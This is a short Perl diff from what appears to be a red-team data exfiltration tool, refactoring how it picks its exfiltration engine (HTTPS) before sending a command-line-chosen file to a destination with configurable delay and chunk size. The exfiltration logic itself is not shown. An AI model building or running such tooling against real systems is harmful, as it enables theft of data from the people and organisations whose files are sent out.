@@ -21,10 +21,21 @@ Maintained by Nitrax <nitrax\@lokisec.fr>
 
 ";
 
+my $engine;
 my $parser = Parser->new();
 
 $parser->parse(@ARGV);
 
-my $engine = HTTPSExfiltration->new(dest => $parser->dest, delay => $parser->delay, size => $parser->size);
+my @factory = (
+    { name => 'HTTPS', className => 'HTTPSExfiltration' }
+);
+
+for my $method (@factory) {
+    if ($method->{name} eq $parser->method) {
+        $engine = $method->{className}->new(dest => $parser->dest, delay => $parser->delay, size => $parser->size);
+
+        last;
+    }
+}
 
 $engine->exfiltrate($parser->file);
